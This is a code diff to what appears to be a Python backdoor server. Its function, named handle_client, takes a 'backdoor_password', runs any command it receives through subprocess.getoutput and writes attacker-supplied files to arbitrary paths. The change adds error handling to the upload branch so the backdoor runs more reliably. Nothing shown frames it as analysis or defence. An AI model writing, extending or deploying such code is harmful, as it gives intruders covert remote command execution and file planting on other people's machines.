@@ -70,20 +70,23 @@ def handle_client(client_socket, backdoor_password):
                 else:
                     client_socket.send(b"0")
             elif command.startswith("upload "):
-                filepath = command.split(" ", 1)[1]
-                data_len_bytes = client_socket.recv(4)
-                if not data_len_bytes:
-                    break
-                data_len = int.from_bytes(data_len_bytes, 'big')
-                data = b""
-                while len(data) < data_len:
-                    packet = client_socket.recv(data_len - len(data))
-                    if not packet:
+                try:
+                    filepath = command.split(" ", 1)[1]
+                    data_len_bytes = client_socket.recv(4)
+                    if not data_len_bytes:
                         break
-                    data += packet
-                with open(filepath, 'wb') as f:
-                    f.write(data)
-                client_socket.send(encryptor.encrypt(b"File uploaded successfully."))
+                    data_len = int.from_bytes(data_len_bytes, 'big')
+                    data = b""
+                    while len(data) < data_len:
+                        packet = client_socket.recv(data_len - len(data))
+                        if not packet:
+                            break
+                        data += packet
+                    with open(filepath, 'wb') as f:
+                        f.write(data)
+                    client_socket.send(encryptor.encrypt(b"File uploaded successfully."))
+                except Exception as e:
+                    client_socket.send(encryptor.encrypt(f"Upload failed: {e}".encode()))
             else:
                 output = subprocess.getoutput(command)
                 client_socket.send(output.encode() + b"\n")
